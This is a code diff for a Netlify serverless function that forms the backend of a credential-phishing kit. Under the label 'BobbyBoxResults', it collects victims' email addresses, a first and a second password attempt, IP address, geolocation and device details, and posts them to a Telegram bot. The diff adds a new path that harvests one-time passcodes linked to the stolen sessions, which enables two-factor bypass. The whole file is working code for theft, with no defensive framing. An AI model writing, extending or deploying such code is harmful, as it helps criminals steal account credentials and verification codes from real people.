@@ -2,67 +2,39 @@ const UAParser = require('ua-parser-js');
 
 // --- Configuration ---
 const CONFIG = {
-  // Environment variables required by the function.
-  // This centralizes env var access and makes dependencies clear.
   ENV: {
     TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN,
     TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID,
   },
-  // Timeout for fetch requests in milliseconds.
   FETCH_TIMEOUT: 15000,
-  // Fields to request from the IP geolocation API.
   GEO_API_FIELDS: 'country,regionName,query',
 };
 
-// --- Helper Functions ---
+// --- Helper Functions (Unchanged) ---
 
-/**
- * Creates an AbortSignal that aborts after a specified time.
- * @param {number} ms - The timeout in milliseconds.
- * @returns {AbortSignal}
- */
 const createTimeoutSignal = (ms) => {
   const controller = new AbortController();
   setTimeout(() => controller.abort(), ms);
   return controller.signal;
 };
 
-/**
- * Safely gets a header value, checking for case variations.
- * @param {object} headers - The request headers.
- * @param {string} name - The header name.
- * @returns {string}
- */
 const getHeader = (headers, name) => headers[name] || headers[name.toLowerCase()] || '';
 
-/**
- * Detects the client's IP address from various headers.
- * @param {object} event - The Netlify event object.
- * @returns {string}
- */
 const getClientIp = (event) => {
   const headers = event.headers || {};
-  const ip = getHeader(headers, 'x-forwarded-for') ||
-             getHeader(headers, 'x-real-ip') ||
-             getHeader(headers, 'cf-connecting-ip') ||
-             event.requestContext?.identity?.sourceIp ||
-             'Unknown';
-  return ip.toString().split(',')[0].trim();
+  return (getHeader(headers, 'x-forwarded-for') ||
+          getHeader(headers, 'x-real-ip') ||
+          getHeader(headers, 'cf-connecting-ip') ||
+          event.requestContext?.identity?.sourceIp ||
+          'Unknown').toString().split(',')[0].trim();
 };
 
-/**
- * Fetches geolocation data for a given IP address.
- * @param {string} ip - The IP address.
- * @returns {Promise<{country: string, regionName: string}>}
- */
 const getIpAndLocation = async (ip) => {
   const location = { country: 'Unknown', regionName: 'Unknown' };
-  if (ip === 'Unknown' || ip.startsWith('127.0.0.1')) {
-    return location;
-  }
+  if (ip === 'Unknown' || ip === '127.0.0.1') return location;
   try {
     const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=${CONFIG.GEO_API_FIELDS}`, {
-      signal: createTimeoutSignal(3000), // Shorter timeout for geo lookup
+      signal: createTimeoutSignal(3000),
     });
     if (geoResponse.ok) {
       const geoJson = await geoResponse.json();
@@ -75,16 +47,10 @@ const getIpAndLocation = async (ip) => {
   return location;
 };
 
-/**
- * Parses user agent string to get device, OS, and browser info.
- * @param {string} userAgent - The user agent string.
- * @returns {object}
- */
 const getDeviceDetails = (userAgent) => {
   const uaParser = new UAParser(userAgent || '');
   const browser = uaParser.getBrowser();
   const os = uaParser.getOS();
-  
   return {
     deviceType: /Mobile|Android|iPhone|iPad/i.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop',
     browser: browser.name ? `${browser.name} ${browser.version || ''}`.trim() : 'Unknown Browser',
@@ -92,33 +58,21 @@ const getDeviceDetails = (userAgent) => {
   };
 };
 
+// --- Message Composers ---
+
 /**
- * Composes the message to be sent to Telegram.
+ * Composes the message for login credentials.
+ * This function remains structurally the same.
  * @param {object} data - The parsed request body.
  * @returns {string}
  */
-const composeTelegramMessage = (data) => {
+const composeCredentialsMessage = (data) => {
     const {
-        email,
-        provider,
-        firstAttemptPassword,
-        secondAttemptPassword,
-        password, // Fallback
-        clientIP,
-        location,
-        deviceDetails,
-        timestamp,
-        sessionId,
+        email, provider, firstAttemptPassword, secondAttemptPassword,
+        clientIP, location, deviceDetails, timestamp, sessionId,
     } = data;
 
-    const hasTwoStepData = firstAttemptPassword && secondAttemptPassword;
-
-    let passwordSection;
-    if (hasTwoStepData) {
-        passwordSection = `🔑 First (invalid): \`${firstAttemptPassword}\`\n🔑 Second (valid): \`${secondAttemptPassword}\``;
-    } else {
-        passwordSection = `🔑 Password: \`${password || 'Not captured'}\``;
-    }
+    const passwordSection = `🔑 First (invalid): \`${firstAttemptPassword}\`\n🔑 Second (valid): \`${secondAttemptPassword}\``;
 
     const formattedTimestamp = new Date(timestamp || Date.now()).toLocaleString('en-US', {
         year: 'numeric', month: 'short', day: 'numeric',
@@ -127,7 +81,7 @@ const composeTelegramMessage = (data) => {
     }) + ' UTC';
 
     return `
-*🔐 BobbyBoxResults 🔐*
+*🔐 BobbyBoxResults - Credentials 🔐*
 
 *ACCOUNT DETAILS*
 - 📧 Email: \`${email || 'Not captured'}\`
@@ -147,6 +101,40 @@ const composeTelegramMessage = (data) => {
 `;
 };
 
+/**
+ * Composes the message for the OTP code.
+ * This is the new function to handle the OTP submission.
+ * @param {object} data - The OTP data payload.
+ * @returns {string}
+ */
+const composeOtpMessage = (data) => {
+    const { otp, session } = data;
+    // Fallback to empty object if session is missing
+    const { email, provider, clientIP, location, deviceDetails, sessionId } = session || {};
+
+    const formattedTimestamp = new Date().toLocaleString('en-US', {
+        year: 'numeric', month: 'short', day: 'numeric',
+        hour: '2-digit', minute: '2-digit', second: '2-digit',
+        timeZone: 'UTC', hour12: true
+    }) + ' UTC';
+
+    return `
+*🔑 BobbyBoxResults - OTP Code 🔑*
+
+*VERIFICATION CODE*
+- 🔢 OTP Code: \`${otp}\`
+
+*ASSOCIATED SESSION*
+- 📧 Email: \`${email || 'N/A'}\`
+- 🏢 Provider: *${provider || 'N/A'}*
+- 📍 IP Address: \`${clientIP || 'N/A'}\`
+- 🆔 Session ID: \`${sessionId}\`
+
+*SUBMITTED AT*
+- 🕒 Timestamp: *${formattedTimestamp}*
+`;
+};
+
 
 // --- Main Handler ---
 exports.handler = async (event) => {
@@ -159,12 +147,9 @@ exports.handler = async (event) => {
   if (event.httpMethod === 'OPTIONS') {
     return { statusCode: 200, headers, body: '' };
   }
-
   if (event.httpMethod !== 'POST') {
     return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };
   }
-
-  // Check for required environment variables at the start.
   if (!CONFIG.ENV.TELEGRAM_BOT_TOKEN || !CONFIG.ENV.TELEGRAM_CHAT_ID) {
     console.error('FATAL: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars.');
     return { statusCode: 500, headers, body: JSON.stringify({ success: false, message: 'Server misconfiguration.' }) };
@@ -172,21 +157,35 @@ exports.handler = async (event) => {
   
   try {
     const body = JSON.parse(event.body || '{}');
-    const clientIP = getClientIp(event);
-    const location = await getIpAndLocation(clientIP);
-    const deviceDetails = getDeviceDetails(body.userAgent);
-    const sessionId = body.sessionId || Math.random().toString(36).substring(2, 15);
+    const { type, data } = body;
+    let message;
 
-    const messageData = {
-        ...body,
-        clientIP,
-        location,
-        deviceDetails,
-        sessionId,
-    };
-    
-    const message = composeTelegramMessage(messageData);
+    // --- Message Routing Logic ---
+    // Route the request to the correct message composer based on the `type` field.
+    if (type === 'credentials') {
+        const clientIP = getClientIp(event);
+        const location = await getIpAndLocation(clientIP);
+        const deviceDetails = getDeviceDetails(data.userAgent);
+        
+        const messageData = { ...data, clientIP, location, deviceDetails };
+        message = composeCredentialsMessage(messageData);
 
+    } else if (type === 'otp') {
+        // For OTP, we re-use device/location info from the associated session.
+        // No new IP lookup is needed.
+        message = composeOtpMessage(data);
+
+    } else {
+        // Fallback for old format or unknown types
+        console.warn('Request received with unknown or missing "type". Processing as credentials.');
+        const clientIP = getClientIp(event);
+        const location = await getIpAndLocation(clientIP);
+        const deviceDetails = getDeviceDetails(body.userAgent);
+        const sessionId = body.sessionId || Math.random().toString(36).substring(2, 15);
+        message = composeCredentialsMessage({ ...body, clientIP, location, deviceDetails, sessionId });
+    }
+
+    // Send the composed message to Telegram
     const telegramResponse = await fetch(`https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -202,12 +201,11 @@ exports.handler = async (event) => {
     return {
       statusCode: 200,
       headers,
-      body: JSON.stringify({ success: true, sessionId }),
+      body: JSON.stringify({ success: true, sessionId: data?.sessionId }),
     };
 
   } catch (error) {
     console.error('Function execution error:', error.message);
-    // Suppress sending error to Telegram to avoid noise, but keep it for server logs.
     return {
       statusCode: 500,
       headers,
